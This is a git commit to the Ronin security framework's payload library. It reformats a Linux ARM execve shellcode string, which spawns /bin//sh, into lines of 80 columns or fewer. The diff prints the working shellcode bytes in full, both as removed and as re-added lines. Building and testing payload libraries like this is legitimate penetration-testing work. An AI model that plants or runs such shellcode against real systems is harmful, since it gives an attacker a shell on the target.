93b359a9518916a1cc7e8da1381adf25b529f71c
Postmodern <postmodern.mod3@gmail.com>
2022-12-09 21:03:08 -0800

    Keep shellcode strings within 80 columns.
    * Added assembly comments when available.

--- lib/ronin/payloads/builtin/shellcode/linux/arm/execve.rb
+++ lib/ronin/payloads/builtin/shellcode/linux/arm/execve.rb
@@ -49,7 +49,15 @@ module Ronin
             # Builds the shellcode.
             #
             def build
-              @payload = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68".b
+              @payload = "\x01\x30\x8f\xe2" \
+                         "\x13\xff\x2f\xe1" \
+                         "\x78\x46\x0e\x30" \
+                         "\x01\x90\x49\x1a" \
+                         "\x92\x1a\x08\x27" \
+                         "\xc2\x51\x03\x37" \
+                         "\x01\xdf\x2f\x62" \
+                         "\x69\x6e\x2f\x2f" \
+                         "\x73\x68".b
             end
 
           end
